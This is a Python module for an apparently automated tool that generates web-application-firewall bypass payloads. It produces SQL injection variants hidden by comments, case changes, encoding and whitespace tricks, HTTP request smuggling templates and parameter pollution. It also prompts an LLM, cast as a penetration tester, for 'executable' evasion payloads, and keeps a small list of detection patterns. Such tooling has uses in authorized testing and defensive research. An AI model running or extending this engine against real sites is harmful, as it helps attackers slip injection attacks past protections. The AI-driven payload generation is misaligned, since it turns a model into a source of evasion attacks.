"""
WAF Bypass Techniques - Phase 4
Advanced WAF evasion and LLM-generated bypass payloads
"""
import random
import re
from typing import Dict, Any, List, Optional
from loguru import logger
from itertools import product


class WAFBypassEngine:
    """Automated WAF bypass technique generator"""
    
    def __init__(self, llm_orchestrator=None):
        self.llm = llm_orchestrator
        self.bypass_techniques = self._init_techniques()
        self.successful_bypasses = []
        logger.info("WAF Bypass Engine initialized")
    
    def _init_techniques(self) -> Dict[str, callable]:
        """Initialize bypass techniques"""
        return {
            "encoding": self.encoding_bypass,
            "obfuscation": self.obfuscation_bypass,
            "smuggling": self.request_smuggling,
            "parameter_pollution": self.hpp_bypass,
            "charset": self.charset_manipulation,
            "case_variation": self.case_variation,
            "comment_injection": self.comment_injection,
            "whitespace_tricks": self.whitespace_manipulation
        }
    
    def fuzz_for_weaknesses(self, waf_url: str, base_payload: str) -> List[Dict[str, Any]]:
        """Automated fuzzing to identify filter weaknesses"""
        
        weaknesses = []
        
        # Try all techniques
        for technique_name, technique_func in self.bypass_techniques.items():
            variants = technique_func(base_payload)
            
            for variant in variants:
                # In real implementation, would send request
                # For now, simulate detection
                detected = self._simulate_waf_detection(variant)
                
                if not detected:
                    weaknesses.append({
                        "technique": technique_name,
                        "payload": variant,
                        "bypassed": True
                    })
                    logger.info(f"Found bypass: {technique_name}")
        
        return weaknesses
    
    def _simulate_waf_detection(self, payload: str) -> bool:
        """Simulate WAF detection (for testing)"""
        # Simple simulation - in real system would make actual request
        dangerous_patterns = [
            r"<script>",
            r"union\s+select",
            r"'; drop table",
            r"\.\./\.\."
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                return True
        
        return False
    
    def encoding_bypass(self, payload: str) -> List[str]:
        """Generate encoding-based bypasses"""
        variants = []
        
        # URL encoding
        import urllib.parse
        variants.append(urllib.parse.quote(payload))
        variants.append(urllib.parse.quote(urllib.parse.quote(payload)))  # Double encoding
        
        # HTML entity encoding
        html_encoded = ''.join(f'&#{ord(c)};' for c in payload)
        variants.append(html_encoded)
        
        # Hex encoding
        hex_encoded = ''.join(f'\\x{ord(c):02x}' for c in payload)
        variants.append(hex_encoded)
        
        # Base64
        import base64
        b64_encoded = base64.b64encode(payload.encode()).decode()
        variants.append(b64_encoded)
        
        # Unicode encoding
        unicode_encoded = ''.join(f'\\u{ord(c):04x}' for c in payload)
        variants.append(unicode_encoded)
        
        return variants
    
    def obfuscation_bypass(self, payload: str) -> List[str]:
        """Generate obfuscation-based bypasses"""
        variants = []
        
        # Case variation
        variants.append(payload.swapcase())
        variants.append(payload.upper())
        variants.append(payload.lower())
        
        # Mixed case (bypass regex that checks specific case)
        if "union select" in payload.lower():
            variants.extend([
                payload.replace("union", "UnIoN"),
                payload.replace("select", "SeLeCt"),
                payload.replace("union select", "uNiOn sElEcT")
            ])
        
        # Comment injection
        if "union select" in payload.lower():
            variants.extend([
                payload.replace("union select", "union/**/select"),
                payload.replace("union select", "union/*comment*/select"),
                payload.replace(" ", "/**/")
            ])
        
        # Whitespace variations
        variants.extend([
            payload.replace(" ", "\t"),
            payload.replace(" ", "\n"),
            payload.replace(" ", "\r\n"),
            payload.replace(" ", "/**/")
        ])
        
        return variants
    
    def request_smuggling(self, payload: str) -> List[str]:
        """HTTP request smuggling attacks"""
        smuggling_templates = []
        
        # CL.TE smuggling
        smuggling_templates.append(f"""POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: {len(payload)}
Transfer-Encoding: chunked

0

{payload}""")
        
        # TE.CL smuggling
        smuggling_templates.append(f"""POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

{len(payload):x}
{payload}
0

""")
        
        return smuggling_templates
    
    def hpp_bypass(self, payload: str) -> List[str]:
        """HTTP Parameter Pollution"""
        variants = []
        
        # Duplicate parameters
        if "=" in payload:
            parts = payload.split("=")
            param_name = parts[0]
            param_value = parts[1] if len(parts) > 1 else ""
            
            variants.extend([
                f"{param_name}={param_value}&{param_name}=benign",
                f"{param_name}=benign&{param_name}={param_value}",
                f"{param_name}[]={param_value}",
                f"{param_name}[0]={param_value}"
            ])
        
        # Array notation
        variants.append(f"param[]={payload}")
        
        return variants
    
    def charset_manipulation(self, payload: str) -> List[str]:
        """Charset manipulation techniques"""
        variants = []
        
        # Different charsets
        charsets = ["utf-8", "utf-16", "iso-8859-1", "windows-1252"]
        
        for charset in charsets:
            try:
                encoded = payload.encode(charset)
                # Add charset header suggestion
                variants.append(f"[charset:{charset}]{payload}")
            except:
                pass
        
        # UTF-7 encoding (classic)
        variants.append(payload.replace("<", "+ADw-").replace(">", "+AD4-"))
        
        # Best-fit mapping
        variants.append(payload.replace("'", "ʼ"))  # Different apostrophe
        variants.append(payload.replace('"', '＂'))  # Fullwidth quotation
        
        return variants
    
    def case_variation(self, payload: str) -> List[str]:
        """Generate case variations"""
        variants = []
        
        # Title case
        variants.append(payload.title())
        
        # Alternating case
        alternating = ''.join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(payload)
        )
        variants.append(alternating)
        
        # Random case
        random_case = ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )
        variants.append(random_case)
        
        return variants
    
    def comment_injection(self, payload: str) -> List[str]:
        """SQL comment injection for bypass"""
        variants = []
        
        # MySQL comments
        variants.append(payload.replace(" ", "/**/"))
        variants.append(payload.replace(" ", "/*!*/"))
        variants.append(payload.replace(" ", "/*! */"))
        
        # Inline comments
        for word in payload.split():
            variant = payload.replace(word, f"/*{word}*/")
            variants.append(variant)
        
        # Hash comments
        variants.append(payload + "#")
        variants.append(payload + "-- ")
        
        return variants
    
    def whitespace_manipulation(self, payload: str) -> List[str]:
        """Whitespace manipulation techniques"""
        variants = []
        
        whitespace_chars = [
            " ",      # Space
            "\t",     # Tab
            "\n",     # Newline
            "\r",     # Carriage return
            "\x0b",   # Vertical tab
            "\x0c",   # Form feed
            "\xa0"    # Non-breaking space
        ]
        
        for ws in whitespace_chars:
            variants.append(payload.replace(" ", ws))
        
        # Multiple spaces
        variants.append(re.sub(r" ", "  ", payload))
        variants.append(re.sub(r" ", "   ", payload))
        
        return variants
    
    async def llm_generated_bypass(self, base_payload: str, 
                                   waf_rules: List[str]) -> List[str]:
        """Use LLM to generate creative bypass payloads"""
        
        if not self.llm:
            logger.warning("No LLM available for bypass generation")
            return []
        
        prompt = f"""Given this payload: {base_payload}

And these WAF rules it needs to bypass:
{chr(10).join(f"- {rule}" for rule in waf_rules)}

Generate 5 creative bypass variations that:
1. Maintain the original functionality
2. Evade the regex rules
3. Use obfuscation, encoding, or alternative syntax
4. Are realistic and executable

Return only the payloads, one per line."""
        
        response = self.llm.generate(prompt, system_prompt="You are a penetration testing expert.")
        
        # Parse response
        bypasses = [line.strip() for line in response.split('\n') if line.strip()]
        
        logger.info(f"LLM generated {len(bypasses)} bypass variants")
        return bypasses
    
    def learn_from_success(self, technique: str, payload: str, context: Dict[str, Any]):
        """Learn from successful bypasses"""
        self.successful_bypasses.append({
            "technique": technique,
            "payload": payload,
            "context": context,
            "timestamp": __import__('datetime').datetime.now().isoformat()
        })
        
        logger.info(f"Learned successful bypass: {technique}")
    
    def get_best_techniques(self, waf_type: str = "generic") -> List[str]:
        """Get most successful techniques for WAF type"""
        
        if not self.successful_bypasses:
            return list(self.bypass_techniques.keys())
        
        # Count successes by technique
        from collections import Counter
        technique_counts = Counter(
            b['technique'] for b in self.successful_bypasses
        )
        
        # Return top 5
        return [t[0] for t in technique_counts.most_common(5)]
